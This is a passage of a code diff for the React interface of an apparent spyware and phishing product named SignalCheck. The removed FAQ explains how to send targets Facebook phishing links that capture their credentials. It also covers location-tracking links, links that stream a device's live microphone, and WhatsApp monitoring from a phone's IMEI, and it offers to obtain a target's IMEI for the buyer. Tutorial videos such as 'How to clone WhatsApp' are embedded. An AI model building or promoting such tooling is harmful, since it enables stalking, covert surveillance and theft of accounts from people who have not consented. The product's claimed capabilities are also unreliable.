-                  height: 40,
-                  border: '4px solid #E1306C',
-                  borderTop: '4px solid transparent',
-                  borderRadius: '50%',
-                  animation: 'spin 1s linear infinite'
-                }} />
-                <style>{`
-                  @keyframes spin {
-                    0% { transform: rotate(0deg); }
-                    100% { transform: rotate(360deg); }
-                  }
-                `}</style>
-              </div>
-            </div>
-          )}
-          {active === 'Lessons' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 40 }}>
-              <div style={{ width: '100%', maxWidth: 350, marginBottom: 32 }}>
-                <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center', fontSize: 22 }}>How to clone WhatsApp</h2>
-                <iframe
-                  width="100%"
-                  height="520"
-                  src="https://iframe.vslplay.com/81d6ca52-2104-46d6-9f56-bb2ad83b7094"
-                  title="How to clone WhatsApp"
-                  frameBorder="0"
-                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                  allowFullScreen
-                  style={{ borderRadius: 12, boxShadow: '0 2px 8px #0005', width: '100%', maxWidth: 350, height: 520 }}
-                ></iframe>
-              </div>
-              <div style={{ width: '100%', maxWidth: 350, marginBottom: 32 }}>
-                <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center', fontSize: 22 }}>Spy Location</h2>
-                <iframe
-                  width="100%"
-                  height="520"
-                  src="https://iframe.vslplay.com/d82f9992-bd78-416b-a588-45ceb4d49d3e"
-                  title="Spy Location"
-                  frameBorder="0"
-                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                  allowFullScreen
-                  style={{ borderRadius: 12, boxShadow: '0 2px 8px #0005', width: '100%', maxWidth: 350, height: 520 }}
-                ></iframe>
-              </div>
-              <div style={{ width: '100%', maxWidth: 350, marginBottom: 32 }}>
-                <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center', fontSize: 22 }}>Spy Facebook</h2>
-                <iframe
-                  width="100%"
-                  height="520"
-                  src="https://iframe.vslplay.com/653c70ba-c294-44d8-852e-2640fa145786"
-                  title="Spy Facebook"
-                  frameBorder="0"
-                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                  allowFullScreen
-                  style={{ borderRadius: 12, boxShadow: '0 2px 8px #0005', width: '100%', maxWidth: 350, height: 520 }}
-                ></iframe>
-              </div>
-            </div>
-          )}
-          {active === 'FAQ' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-              <img src="/suporte.jpg" alt="Support FAQ" style={{ display: 'block', margin: '0 auto 2rem auto', width: '100%', maxWidth: 320, borderRadius: 12, boxShadow: '0 2px 8px #0005' }} />
-              <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center' }}>Frequently Asked Questions (FAQ)</h2>
-              <div style={{ marginBottom: 32, textAlign: 'left', maxWidth: 700 }}>
-                <h3 style={{ color: '#E60033', marginBottom: 8 }}>How to use each tool:</h3>
-                <b>Lessons</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>Access tutorials and instructions for using all features of SignalCheck.</li>
-                  <li>Click on "Lessons" and follow the guides to learn step by step.</li>
-                </ul>
-                <b>Spy Location</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>Generate a tracking link and send it to the target device.</li>
-                  <li>When the link is accessed, the device's location will be captured and shown in "Your tracking links".</li>
-                  <li>Click "Refresh list" to update the accesses.</li>
-                </ul>
-                <b>WhatsApp</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>Enter the phone number, device model, and IMEI of the target device.</li>
-                  <li>Follow the instructions to connect and monitor WhatsApp conversations.</li>
-                  <li>If you don't have the IMEI, use the help link to learn how to get it or request support.</li>
-                </ul>
-                <b>Facebook Phishing</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>Generate a Facebook phishing link and send it to the target.</li>
-                  <li>When the target enters their credentials, the data will be captured and shown in the dashboard.</li>
-                  <li>Use responsibly and only for authorized testing or recovery.</li>
-                </ul>
-                <b>Microphone</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>Generate a microphone link and send it to the target device.</li>
-                  <li>When accessed, you can listen to real-time audio from the device's microphone.</li>
-                </ul>
-                <b>IMEI Support</b>
-                <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
-                  <li>If you cannot get the IMEI of the target device, open a support ticket via the IMEI Support page.</li>
-                  <li>Provide the phone number, device model/version, and your contact email.</li>
-                  <li>Our team will try to obtain the IMEI for you within 7-10 business days.</li>
-                </ul>
-              </div>
-              <div style={{ color: '#b0b0b0', fontSize: 15, textAlign: 'center', marginTop: 32 }}>
-                If you have more questions, please contact our support team.
-                <br />
-                <button
-                  style={{
-                    marginTop: 24,
-                    background: '#25d366',
-                    color: '#fff',
-                    border: 'none',
-                    borderRadius: 8,
-                    padding: '0.7rem 1.7rem',
-                    fontSize: '1rem',
-                    fontWeight: 700,
-                    cursor: 'pointer',
-                    display: 'inline-block',
-                  }}
-                  onClick={() => window.location.href = 'https://app-perfectpay-combr.vercel.app/'}
-                >
-                  Request a refund
-                </button>
-              </div>
-            </div>
-          )}
-          {active === 'Support and refund' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+            )}
+            {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
               <div style={{
-                margin: '0 auto 2rem auto',
-                color: '#b0b0b0',
-                fontSize: 15,
+                background: 'var(--fundo-destaque)',
+                borderRadius: 16,
+                boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
+                padding: '2.5rem 1.5rem',
                 textAlign: 'center',
-                maxWidth: 480
+                color: 'var(--cinza-conspiracao)',
+                fontSize: 20,
+                marginTop: 32
               }}>
-                <b>Refund Policy:</b><br />
-                Refund requests are subject to analysis and approval by our technical and financial team. The refund will be processed only if the product or service does not meet the described specifications, or in case of proven technical issues that cannot be resolved by our support.<br /><br />
-                <b>If you request a refund within 7 days of purchase, you will be refunded within 7 business days.</b><br /><br />
-                The refund process may take up to 7 business days after approval. Please provide all necessary information to expedite your request.
-                <br />
-                <button
-                  style={{
-                    marginTop: 24,
-                    background: '#1a73e8',
-                    color: '#fff',
-                    border: 'none',
-                    borderRadius: 8,
-                    padding: '0.7rem 1.7rem',
-                    fontSize: '1rem',
-                    fontWeight: 700,
-                    cursor: 'pointer',
-                    width: '100%',
-                    maxWidth: 300,
-                    display: 'block',
-                    marginLeft: 'auto',
-                    marginRight: 'auto',
-                  }}
-                  onClick={() => window.location.href = 'https://app-perfectpay-combr.vercel.app/'}
-                >
-                  Request a refund
-                </button>
+                <b>{active}</b> coming soon...
               </div>
-              <h2 style={{ color: '#E60033', marginBottom: 18 }}>Support</h2>
-              <p style={{ fontSize: 18, marginBottom: 24 }}>If you need help, please open a support ticket below. Our team will get back to you as soon as possible.</p>
-              <SupportForm />
-            </div>
-          )}
+            )}
+          </div>
         </div>
       </div>
-    </>
-  );
-}
-
-function SupportForm() {
-  const [name, setName] = useState('');
-  const [email, setEmail] = useState('');
-  const [subject, setSubject] = useState('');
-  const [message, setMessage] = useState('');
-  const [sent, setSent] = useState(false);
-
-  function handleSubmit(e) {
-    e.preventDefault();
-    setSent(true);
-  }
-
-  return (
-    <form onSubmit={handleSubmit} style={{ maxWidth: 400, margin: '0 auto', textAlign: 'left' }}>
-      <label style={{ color: '#fff', fontWeight: 600 }}>Name</label>
-      <input type="text" value={name} onChange={e => setName(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
-      <label style={{ color: '#fff', fontWeight: 600 }}>Email</label>
-      <input type="email" value={email} onChange={e => setEmail(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
-      <label style={{ color: '#fff', fontWeight: 600 }}>Subject</label>
-      <input type="text" value={subject} onChange={e => setSubject(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
-      <label style={{ color: '#fff', fontWeight: 600 }}>Message</label>
-      <textarea value={message} onChange={e => setMessage(e.target.value)} required rows={5} style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 18, fontSize: 16, background: '#181A1B', color: '#fff', resize: 'vertical' }} />
-      <button type="submit" style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.7rem 1.7rem', fontSize: '1rem', fontWeight: 700, cursor: 'pointer', width: '100%', marginBottom: 10 }}>Submit Ticket</button>
-      {sent && (
-        <div style={{ color: '#25d366', marginTop: 18, fontWeight: 600, fontSize: 17, textAlign: 'center' }}>
-          Your ticket has been opened.
-        </div>
-      )}
-    </form>
-  );
-}
-
-function LessonsVideos() {
-  const videos = [
-    {
-      url: 'https://www.youtube.com/embed/X30N6ybuju4',
-      title: 'How to clone WhatsApp',
-      type: 'youtube',
-    },
-    {
-      url: 'https://iframe.vslplay.com/d82f9992-bd78-416b-a588-45ceb4d49d3e',
-      title: 'Spy Location',
-      type: 'vslplay',
-    },
-    {
-      url: 'https://www.youtube.com/embed/VJFKb2i-9j8',
-      title: 'Spy Facebook',
-      type: 'youtube',
-    },
-  ];
-  const [step, setStep] = useState(0);
-  const [showButton, setShowButton] = useState(false);
-
-  useEffect(() => {
-    setShowButton(false);
-    let timeout;
-    if (step === 0) timeout = setTimeout(() => setShowButton(true), 15000);
-    else if (step === 1 || step === 2) timeout = setTimeout(() => setShowButton(true), 20000);
-    return () => clearTimeout(timeout);
-  }, [step]);
-
-  function handleNext() {
-    if (step < videos.length - 1) {
-      setStep(step + 1);
-    } else {
-      setShowButton(false);
-    }
-  }
-
-  return (
-    <div style={{ minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', width: '100%' }}>
-      <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center', fontSize: 22 }}>{videos[step].title}</h2>
-      <div style={{ width: '100%', maxWidth: 350, marginBottom: 32 }}>
-        {videos[step].type === 'youtube' ? (
-          <iframe
-            width="100%"
-            height="520"
-            src={videos[step].url}
-            title={videos[step].title}
-            frameBorder="0"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-            allowFullScreen
-            style={{ borderRadius: 12, boxShadow: '0 2px 8px #0005', width: '100%', maxWidth: 350, height: 520 }}
-          ></iframe>
-        ) : (
-          <iframe
-            width="100%"
-            height="520"
-            src={videos[step].url}
-            title={videos[step].title}
-            frameBorder="0"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-            allowFullScreen
-            style={{ borderRadius: 12, boxShadow: '0 2px 8px #0005', width: '100%', maxWidth: 350, height: 520 }}
-          ></iframe>
-        )}
-      </div>
-      {showButton && (step < videos.length - 1 ? (
-        <button
-          onClick={handleNext}
-          style={{
-            background: '#25d366',
-            color: '#fff',
-            border: 'none',
-            borderRadius: 8,
-            padding: '0.7rem 1.7rem',
-            fontSize: '1rem',
-            fontWeight: 700,
-            cursor: 'pointer',
-            marginTop: 16,
-            minWidth: 160
-          }}
-        >
-          Understood!
-        </button>
-      ) : showButton && (
-        <div style={{ color: '#25d366', marginTop: 24, fontWeight: 600, fontSize: 18, textAlign: 'center' }}>
-          Tutorial completed!
-        </div>
-      ))}
     </div>
   );
 }
